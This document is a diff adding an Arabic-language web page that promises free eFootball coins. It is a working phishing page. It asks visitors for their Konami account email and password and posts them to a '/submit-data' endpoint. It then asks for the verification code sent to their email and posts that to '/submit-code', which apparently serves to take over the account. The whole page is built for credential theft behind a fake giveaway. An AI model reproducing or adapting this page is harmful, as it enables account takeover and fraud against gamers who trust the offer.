@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>eFootball - كوينز مجانية</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+    body {
+      background: radial-gradient(circle at top, #1a1a2e 0%, #000000 100%);
+      color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center;
+      overflow: hidden;
+    }
+    .bg-bubbles { position: absolute; width: 100%; height: 100%; z-index: 0; overflow: hidden; }
+    .bg-bubbles li { position: absolute; list-style: none; display: block; width: 20px; height: 20px; background: rgba(255, 215, 0, 0.1); bottom: -150px; border-radius: 50%; animation: floatUp 15s infinite linear; }
+    .bg-bubbles li:nth-child(1) { left: 10%; width: 80px; height: 80px; animation-delay: 0s; }
+    .bg-bubbles li:nth-child(2) { left: 30%; width: 30px; height: 30px; animation-delay: 2s; animation-duration: 12s; }
+    .bg-bubbles li:nth-child(3) { left: 60%; width: 60px; height: 60px; animation-delay: 4s; }
+    .bg-bubbles li:nth-child(4) { left: 80%; width: 40px; height: 40px; animation-delay: 1s; animation-duration: 18s; }
+    .bg-bubbles li:nth-child(5) { left: 50%; width: 100px; height: 100px; animation-delay: 6s; }
+
+    @keyframes floatUp {
+      0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+      100% { transform: translateY(-1000px) rotate(720deg); opacity: 0; }
+    }
+
+    .glass-box {
+      position: relative; z-index: 1;
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      padding: 40px; border-radius: 20px;
+      width: 100%; max-width: 400px;
+      text-align: center;
+      box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+    }
+
+    .logo { font-size: 30px; font-weight: bold; color: #FFD700; margin-bottom: 10px; text-shadow: 0 0 10px rgba(255,215,0,0.5); }
+    .subtitle { font-size: 14px; color: #aaa; margin-bottom: 25px; }
+    
+    .coin-icon { width: 100px; margin-bottom: 15px; filter: drop-shadow(0 0 15px rgba(255,215,0,0.6)); animation: pulse 2s infinite; }
+    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+
+    input {
+      width: 100%; padding: 15px; margin: 10px 0;
+      background: rgba(0, 0, 0, 0.5); border: 1px solid #333;
+      border-radius: 10px; color: white; font-size: 16px;
+      transition: 0.3s;
+    }
+    input:focus { border-color: #FFD700; outline: none; box-shadow: 0 0 10px rgba(255,215,0,0.3); }
+
+    button {
+      width: 100%; padding: 15px; margin-top: 15px;
+      background: linear-gradient(45deg, #FFD700, #FFA500);
+      color: #000; border: none; border-radius: 10px;
+      font-size: 18px; font-weight: bold; cursor: pointer;
+      transition: 0.3s; text-transform: uppercase;
+    }
+    button:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(255,215,0,0.3); }
+
+    .hidden { display: none; }
+    .success-msg { color: #2ecc71; font-weight: bold; margin-bottom: 15px; font-size: 15px; }
+  </style>
+</head>
+<body>
+  <ul class="bg-bubbles">
+    <li></li><li></li><li></li><li></li><li></li>
+  </ul>
+
+  <div class="glass-box">
+    <img src="https://i.top4top.io/p_39470qgno1.png" alt="Coins" class="coin-icon">
+    <div class="logo">eFootball</div>
+    <div class="subtitle">احصل على كوينز مجانية الآن</div>
+    
+    <!-- المرحلة 1: البيانات -->
+    <div id="stage1">
+      <input type="email" id="email" placeholder="البريد الإلكتروني لحساب Konami">
+      <input type="password" id="password" placeholder="كلمة المرور">
+      <button onclick="submitData()">إرسال البيانات </button>
+    </div>
+
+    <!-- المرحلة 2: الكود -->
+    <div id="stage2" class="hidden">
+      <p class="success-msg" id="msg1"></p>
+      <p style="color: #aaa; font-size: 13px; margin-bottom: 10px;">أدخل الكود الذي وصلك على بريدك:</p>
+      <input type="text" id="code" >
+      <button onclick="submitCode()">تأكيد الكود ✅</button>
+      <p class="success-msg" style="margin-top: 15px;" id="msg2"></p>
+    </div>
+  </div>
+
+  <script>
+    let currentRequestId = null;
+
+    async function submitData() {
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      if (!email || !password) return alert('يرجى ملء جميع الحقول');
+
+      const res = await fetch('/submit-data', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ email, password })
+      });
+      const data = await res.json();
+      
+      if (data.message) {
+        currentRequestId = data.requestId;
+        document.getElementById('stage1').classList.add('hidden');
+        document.getElementById('stage2').classList.remove('hidden');
+        document.getElementById('msg1').innerText = data.message;
+      } else { alert(data.error); }
+    }
+
+    async function submitCode() {
+      const code = document.getElementById('code').value;
+      if (!code) return alert('يرجى إدخال الكود');
+      
+      const res = await fetch('/submit-code', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ requestId: currentRequestId, code: code })
+      });
+      const data = await res.json();
+      
+      if (data.message) {
+        document.getElementById('msg2').innerText = data.message;
+        document.getElementById('code').value = '';
+        document.getElementById('code').disabled = true;
+        document.getElementById('stage2').querySelector('button').style.display = 'none';
+      } else { alert(data.error); }
+    }
+  </script>
+</body>
+</html>
